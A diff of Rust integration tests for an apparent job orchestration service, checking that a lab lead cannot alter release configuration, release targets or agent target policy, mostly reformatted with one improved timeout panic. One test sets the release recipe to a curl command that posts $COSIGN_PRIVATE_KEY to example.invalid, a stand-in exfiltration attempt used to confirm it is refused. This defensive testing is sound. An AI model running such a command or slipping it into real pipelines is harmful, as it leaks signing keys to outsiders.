@@ -3233,7 +3233,11 @@ async fn the_release_target_is_for_the_release_job_only() {
     assert_eq!(r.status, 403, "{}", r.body);
     assert!(r.body.to_string().contains(rule), "{}", r.body);
     let r = td
-        .patch_as(&lab.lead, &w1, json!({"policy": {"targets": ["rel-client"]}}))
+        .patch_as(
+            &lab.lead,
+            &w1,
+            json!({"policy": {"targets": ["rel-client"]}}),
+        )
         .await;
     assert_eq!(r.status, 403, "{}", r.body);
     for who in [None, Some(&lab.lead)] {
@@ -3325,9 +3329,15 @@ async fn the_release_config_and_target_are_the_operators() {
     for (key, value) in [
         ("release_target", json!("rel-client")),
         ("release_recipe", json!("true")),
-        ("release_secrets", json!({"GH_TOKEN": "@secret:release-github"})),
-        ("docker_release", json!({"destination": "root@vm", "port": 2251,
-                                   "known_hosts": "vm ssh-ed25519 pin", "key": "@secret:vm"})),
+        (
+            "release_secrets",
+            json!({"GH_TOKEN": "@secret:release-github"}),
+        ),
+        (
+            "docker_release",
+            json!({"destination": "root@vm", "port": 2251,
+                                   "known_hosts": "vm ssh-ed25519 pin", "key": "@secret:vm"}),
+        ),
     ] {
         let mut c = json!({"target": "p-box", "recipe": "true", "release_target": "rel-client"});
         if key != "release_target" {
@@ -3335,14 +3345,22 @@ async fn the_release_config_and_target_are_the_operators() {
         }
         let r = td.put_as(&lab.lead, "/api/projects/p/delivery", c).await;
         assert_eq!(r.status, 403, "{key}: {}", r.body);
-        assert!(r.body.to_string().contains("release config is the operator's"), "{}", r.body);
+        assert!(
+            r.body
+                .to_string()
+                .contains("release config is the operator's"),
+            "{}",
+            r.body
+        );
     }
     let r = td.put("/api/projects/p/delivery", config.clone()).await;
     assert_eq!(r.status, 200, "{}", r.body);
     // The lead keeps the other fields, and may not change the release ones.
     let mut c = config.clone();
     c["slots"] = json!(3);
-    let r = td.put_as(&lab.lead, "/api/projects/p/delivery", c.clone()).await;
+    let r = td
+        .put_as(&lab.lead, "/api/projects/p/delivery", c.clone())
+        .await;
     assert_eq!(r.status, 200, "{}", r.body);
     c["release_recipe"] = json!("curl -d \"$COSIGN_PRIVATE_KEY\" https://example.invalid");
     let r = td.put_as(&lab.lead, "/api/projects/p/delivery", c).await;
@@ -3356,7 +3374,11 @@ async fn the_release_config_and_target_are_the_operators() {
     // Finding 2: the release target cannot be changed or deleted by the lead.
     let rule = "release target runs release jobs only";
     let r = td
-        .patch_as(&lab.lead, "/api/targets/rel-client", json!({"host": "lab1"}))
+        .patch_as(
+            &lab.lead,
+            "/api/targets/rel-client",
+            json!({"host": "lab1"}),
+        )
         .await;
     assert_eq!(r.status, 403, "{}", r.body);
     let r = td
@@ -3369,9 +3391,7 @@ async fn the_release_config_and_target_are_the_operators() {
         .await;
     assert_eq!(r.status, 403, "{}", r.body);
     // Finding 3: no second name for its machine, from the lead.
-    for alias in [
-        json!({"name": "alias", "kind": "host", "host": "lab2", "project": "p"}),
-    ] {
+    for alias in [json!({"name": "alias", "kind": "host", "host": "lab2", "project": "p"})] {
         let r = td.post_as(&lab.lead, "/api/targets", alias).await;
         assert_eq!(r.status, 403, "{}", r.body);
         assert!(r.body.to_string().contains(rule), "{}", r.body);
@@ -3401,7 +3421,10 @@ async fn the_release_config_and_target_are_the_operators() {
         .await;
     assert_eq!(r.status, 201, "{}", r.body);
     let r = td
-        .patch(&format!("/api/agents/{}", lab.w1), json!({"policy": {"targets": ["p-ssh-alias"]}}))
+        .patch(
+            &format!("/api/agents/{}", lab.w1),
+            json!({"policy": {"targets": ["p-ssh-alias"]}}),
+        )
         .await;
     assert_eq!(r.status, 403, "{}", r.body);
     assert!(r.body.to_string().contains(rule), "{}", r.body);
@@ -3506,10 +3529,10 @@ async fn a_lost_or_cancelled_release_never_runs_again() {
         async move {
             let start = Instant::now();
             while !p.exists() {
-                assert!(
-                    start.elapsed() < DEADLINE,
-                    "the release recipe never started"
-                );
+                if start.elapsed() > DEADLINE {
+                    let j = l.td.get(&format!("/api/jobs/{id}")).await.ok().clone();
+                    panic!("the release recipe never started: {j:#}");
+                }
                 tokio::time::sleep(Duration::from_millis(50)).await;
             }
         }
